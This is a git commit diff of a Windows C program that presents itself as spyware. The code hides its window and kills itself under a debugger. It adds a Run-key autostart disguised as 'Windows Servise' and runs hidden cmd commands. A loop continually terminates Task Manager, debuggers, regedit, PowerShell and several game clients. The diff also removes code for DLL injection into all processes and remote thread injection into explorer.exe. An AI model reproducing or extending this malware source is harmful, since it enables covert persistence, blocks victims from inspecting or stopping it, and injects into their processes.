167ebcb052c7b0e866b02064f473072b844abaa2
LJHP-CODER <leejuh1621@gmail.com>
2022-06-11 06:41:58 +0900

    Updated

--- Code.c
+++ Code.c
@@ -10,103 +10,14 @@
 #define SUCCESS_SIGN 0x00000000
 #define MAX_LENGTH 255
 
-WCHAR TargetProcess[17][128];
+WCHAR targetProcess[17][128];
 
-/*
-BOOL EXPLORER_SIGN = FALSE;
-
-typedef HANDLE(WINAPI* PFCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32PRocessID);
-typedef BOOL(WINAPI* PFProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-typedef BOOL(WINAPI* PFProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-typedef int(WINAPI* PFwcscmp)(const wchar_t* string1, const wchar_t* string2);
-typedef HANDLE(WINAPI* PFOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
-typedef BOOL(WINAPI* PFTerminateProcess)(HANDLE hProcess, UINT uExitCode);
-typedef BOOL(WINAPI* PFCloseHandle)(HANDLE hObject);
-typedef HMODULE(WINAPI* PFLoadLibraryA)(LPCSTR lpLibFileName);
-typedef FARPROC(WINAPI* PFGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
-
-typedef struct _THREAD_PARAM {
-	FARPROC pFunc[2];
-	char pStr[7][128];
-	WCHAR WStr[17][128];
-	//pStr[0] = kernel32.dll
-	//pStr[1] = CreateToolhelp32Snapshot
-	//pStr[2] = Process32First
-	//pStr[3] = OpenProcess
-	//pStr[4] = TerminateProcess
-	//pStr[5] = CloseHandle
-	//pStr[6] = Process32Next
-
-	//WStr[0] = "OLLYDBG.EXE"
-	//WStr[1] = "Taskmgr.exe"
-	//WStr[2] = "x32dbg.exe"
-	//WStr[3] = "x64dbg.exe"
-	//WStr[4] = "iexplore.exe"
-	//WStr[5] = "procexp64.exe"
-	//WStr[6] = "procexp.exe"
-	//WStr[7] = "League of Legends.exe"
-	//WStr[8] = "LeagueClient.exe"
-	//WStr[9] = "LeagueClientUx.exe"
-	//WStr[10] = "regedit.exe"
-	//WStr[11] = "powershell.exe"
-	//WStr[12] = "RiotClientServices.exe"
-	//WStr[13] = "RiotClientUx.exe"
-	//WStr[14] = "suddenattack.exe"
-	//WStr[15] = "tasklist.exe"
-	//WStr[16] = "taskkill.exe"
-}THREAD_PARAM, * PTHREAD_PARAM;
-*/
-void CheckDebugger();
-//DWORD GetPID();
-//void ExplorerManager();
-void ProcessManager();
+void checkDebugger();
+void processManager();
 
 BOOL injectAllProcess(LPCTSTR szDllPath);
 BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath);
 
-/*
-void ProcessManager(LPVOID pParam) {
-	PTHREAD_PARAM param = (PTHREAD_PARAM)pParam;
-	HMODULE Kernel_hMod = NULL;
-	PFCreateToolhelp32Snapshot pCreateToolhelp32Snapshot = NULL;
-	PFProcess32First pProcess32First = NULL;
-	PFProcess32Next pProcess32Next = NULL;
-	PFOpenProcess pOpenProcess = NULL;
-	PFTerminateProcess pTerminateProcess = NULL;
-	PFCloseHandle pCloseHandle = NULL;
-
-	Kernel_hMod = ((PFLoadLibraryA)param->pFunc[0])(param->pStr[0]);
-	pCreateToolhelp32Snapshot = (PFCreateToolhelp32Snapshot)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[1]);
-	pProcess32First = (PFProcess32First)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[2]);
-	pProcess32Next = (PFProcess32Next)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[6]);
-	pOpenProcess = (PFOpenProcess)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[3]);
-	pTerminateProcess = (PFTerminateProcess)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[4]);
-	pCloseHandle = (PFCloseHandle)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[5]);
-
-	while (1) {
-		HANDLE hProcess = NULL;
-		PROCESSENTRY32 pe32 = { 0 };
-		hProcess = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-		pe32.dwSize = sizeof(PROCESSENTRY32);
-		BOOL ISCHECKED = FALSE;
-
-		if (pProcess32First(hProcess, &pe32)) {
-			do {
-				if (ISCHECKED) {
-					HANDLE hProcess_ = pOpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
-
-					if (hProcess_ != NULL) {
-						pTerminateProcess(hProcess_, 0);
-						pCloseHandle(hProcess_);
-					}
-					ISCHECKED = FALSE;
-				}
-			} while (pProcess32Next(hProcess, &pe32));
-		}
-		pCloseHandle(hProcess);
-	}
-}
-*/
 
 DWORD main(int argc, char* argv[]) {
 	//Hide
@@ -124,7 +35,7 @@ DWORD main(int argc, char* argv[]) {
 	}
 
 	HANDLE Thread[2];
-	Thread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckDebugger, NULL, 0, NULL);
+	Thread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)checkDebugger, NULL, 0, NULL);
 
 	//First Run
 	DWORD dwDisp = 0;
@@ -210,11 +121,6 @@ DWORD main(int argc, char* argv[]) {
 	}
 	CloseHandle(WD);
 
-
-	//Register The Spyware Exception...
-	
-
-
 	HKEY autokey = NULL;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &autokey);
 	if (result != ERROR_SUCCESS) {
@@ -224,7 +130,7 @@ DWORD main(int argc, char* argv[]) {
 
 	else {
 		result = 0;
-		result = RegSetValueExA(autokey, "Windows Service", 0, REG_SZ, (BYTE*)spyTemp, strlen(spyTemp));
+		result = RegSetValueExA(autokey, "Windows Servise", 0, REG_SZ, (BYTE*)spyTemp, strlen(spyTemp));
 		if (result != ERROR_SUCCESS) {
 			return ERROR_SIGN;
 		}
@@ -246,128 +152,42 @@ DWORD main(int argc, char* argv[]) {
 	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD2, _T("C:\\"), SW_HIDE);
 
 	//Process Stealth
-	LPCTSTR Path[MAX_PATH];
-	GetCurrentDirectoryW(MAX_PATH, Path);
-	lstrcatW(Path, L"\\DLL\\BugDLL.dll");
+	
 
-	injectAllProcess(Path);
+
+
+
+
+
+
 
 	//Set The Target Process'
-	wcscpy(TargetProcess[0], L"OLLYDBG.EXE");
-	wcscpy(TargetProcess[1], L"Taskmgr.exe");
-	wcscpy(TargetProcess[2], L"x32dbg.exe");
-	wcscpy(TargetProcess[3], L"x64dbg.exe");
-	wcscpy(TargetProcess[4], L"iexplore.exe");
-	//wcscpy(TargetProcess[5], L"procexp64.exe");
-	//wcscpy(TargetProcess[6], L"procexp.exe");
-	wcscpy(TargetProcess[7], L"League of Legends.exe");
-	wcscpy(TargetProcess[8], L"LeagueClient.exe");
-	wcscpy(TargetProcess[9], L"LeagueClientUx.exe");
-	wcscpy(TargetProcess[10], L"regedit.exe");
-	wcscpy(TargetProcess[11], L"powershell.exe");
-	wcscpy(TargetProcess[12], L"RiotClientServices.exe");
-	wcscpy(TargetProcess[13], L"RiotClientUx.exe");
-	wcscpy(TargetProcess[14], L"suddenattack.exe");
-	wcscpy(TargetProcess[15], L"tasklist.exe");
-	wcscpy(TargetProcess[16], L"taskkill.exe");
+	wcscpy(targetProcess[0], L"OLLYDBG.EXE");
+	wcscpy(targetProcess[1], L"Taskmgr.exe");
+	wcscpy(targetProcess[2], L"x32dbg.exe");
+	wcscpy(targetProcess[3], L"x64dbg.exe");
+	wcscpy(targetProcess[4], L"iexplore.exe");
+	wcscpy(targetProcess[5], L"procexp64.exe");
+	wcscpy(targetProcess[6], L"procexp.exe");
+	wcscpy(targetProcess[7], L"League of Legends.exe");
+	wcscpy(targetProcess[8], L"LeagueClient.exe");
+	wcscpy(targetProcess[9], L"LeagueClientUx.exe");
+	wcscpy(targetProcess[10], L"regedit.exe");
+	wcscpy(targetProcess[11], L"powershell.exe");
+	wcscpy(targetProcess[12], L"RiotClientServices.exe");
+	wcscpy(targetProcess[13], L"RiotClientUx.exe");
+	wcscpy(targetProcess[14], L"suddenattack.exe");
+	wcscpy(targetProcess[15], L"tasklist.exe");
+	wcscpy(targetProcess[16], L"taskkill.exe");
 
 	//Create ProcessManager Thread
-	Thread[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessManager, NULL, 0, NULL);
+	Thread[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)processManager, NULL, 0, NULL);
 	WaitForMultipleObjects(2, Thread, TRUE, INFINITE);
-
-	/*
-	DWORD EPID = ERROR_SIGN;
-	while (1) {
-		EPID = GetPID();
-
-		if (EPID != ERROR_SIGN) {
-			break;
-		}
-	}
-	
-	//Code Injection -> Explorer
-	THREAD_PARAM param = { 0, };
-	__int64 dwSize;
-
-	HMODULE hMod = GetModuleHandleA("kernel32.dll");
-	LPVOID pRemoteBuf[2] = { 0, };
-
-	if (hMod) {
-		param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
-		param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");
-
-		strcpy_s(param.pStr[0], 128, "kernel32.dll");
-		strcpy_s(param.pStr[1], 128, "CreateToolhelp32Snapshot");
-		strcpy_s(param.pStr[2], 128, "Process32First");
-		strcpy_s(param.pStr[3], 128, "OpenProcess");
-		strcpy_s(param.pStr[4], 128, "TerminateProcess");
-		strcpy_s(param.pStr[5], 128, "CloseHandle");
-		strcpy_s(param.pStr[6], 128, "Process32Next");
-
-		wcscpy(param.WStr[0], L"OLLYDBG.EXE");
-		wcscpy(param.WStr[1], L"Taskmgr.exe");
-		wcscpy(param.WStr[2], L"x32dbg.exe");
-		wcscpy(param.WStr[3], L"x64dbg.exe");
-		wcscpy(param.WStr[4], L"iexplore.exe");
-		wcscpy(param.WStr[5], L"procexp64.exe");
-		wcscpy(param.WStr[6], L"procexp.exe");
-		wcscpy(param.WStr[7], L"League of Legends.exe");
-		wcscpy(param.WStr[8], L"LeagueClient.exe");
-		wcscpy(param.WStr[9], L"LeagueClientUx.exe");
-		wcscpy(param.WStr[10], L"regedit.exe");
-		wcscpy(param.WStr[11], L"powershell.exe");
-		wcscpy(param.WStr[12], L"RiotClientServices.exe");
-		wcscpy(param.WStr[13], L"RiotClientUx.exe");
-		wcscpy(param.WStr[14], L"suddenattack.exe");
-		wcscpy(param.WStr[15], L"tasklist.exe");
-		wcscpy(param.WStr[16], L"taskkill.exe");
-
-		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EPID);
-		printf("[+] Target Process : 0x%p\n", hProcess);
-		dwSize = sizeof(THREAD_PARAM);
-		pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
-		if (pRemoteBuf[0]) {
-			printf("[+] pRemoteBuf : 0x%p\n", pRemoteBuf[0]);
-			WriteProcessMemory(hProcess, pRemoteBuf[0], (LPCVOID)&param, dwSize, NULL);
-			dwSize = (int*)main - (int*)ProcessManager;
-
-			pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-			if (pRemoteBuf[1]) {
-				printf("[+] ThreadBuf : 0x%p\n", pRemoteBuf[1]);
-				WriteProcessMemory(hProcess, pRemoteBuf[1], (LPCVOID)ProcessManager, dwSize, NULL);
-
-				HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);
-				if (hThread) {
-					printf("[+] hThread : 0x%p\n", hThread);
-					WaitForSingleObject(hThread, INFINITE);
-					CloseHandle(hThread);
-					CloseHandle(hProcess);
-
-					system("pause");
-				}
-				else {
-					return ERROR_SIGN;
-				}
-			}
-			else {
-				return ERROR_SIGN;
-			}
-		}
-		else {
-			return ERROR_SIGN;
-		}
-	}
-
-	else {
-		return ERROR_SIGN;
-	}
-	*/
 
 	return ERROR_SIGN;
 }
 
-
-void ProcessManager() {
+void processManager() {
 	while (1) {
 		HANDLE hProcess = NULL;
 		PROCESSENTRY32 pe32 = { 0 };
@@ -380,7 +200,7 @@ void ProcessManager() {
 			do {
 				//Checking
 				for (i = 0; i < 17; i++) {
-					if (!wcscmp(pe32.szExeFile, TargetProcess[i])) {
+					if (!wcscmp(pe32.szExeFile, targetProcess[i])) {
 						if (ISCHECKED == FALSE) {
 							ISCHECKED = TRUE;
 						}
@@ -403,8 +223,7 @@ void ProcessManager() {
 	}
 }
 
-
-void CheckDebugger() {
+void checkDebugger() {
 	while (1) {
 		Sleep(1000);
 		if (IsDebuggerPresent()) {
@@ -412,6 +231,16 @@ void CheckDebugger() {
 		}
 	}
 }
+
+
+
+
+
+
+
+
+
+
 
 BOOL injectAllProcess(LPCTSTR szDllPath) {
 	DWORD dwPID = 0;
@@ -462,31 +291,3 @@ BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath) {
 
 	return TRUE;
 }
-
-
-/*
-DWORD GetPID() {
-	HANDLE hProcess = NULL;
-	PROCESSENTRY32 pe32 = { 0 };
-	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	pe32.dwSize = sizeof(PROCESSENTRY32);
-
-	if (Process32First(hProcess, &pe32)) {
-		do {
-			if (!wcscmp(pe32.szExeFile, TEXT("explorer.exe"))) {
-				HANDLE hProcess_ = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
-
-				if (hProcess_ != NULL) {
-					CloseHandle(hProcess_);
-					return pe32.th32ProcessID;
-				}
-				else {
-					return ERROR_SIGN;
-				}
-			}
-		} while (Process32Next(hProcess, &pe32));
-	}
-	CloseHandle(hProcess);
-	return ERROR_SIGN;
-}
-*/
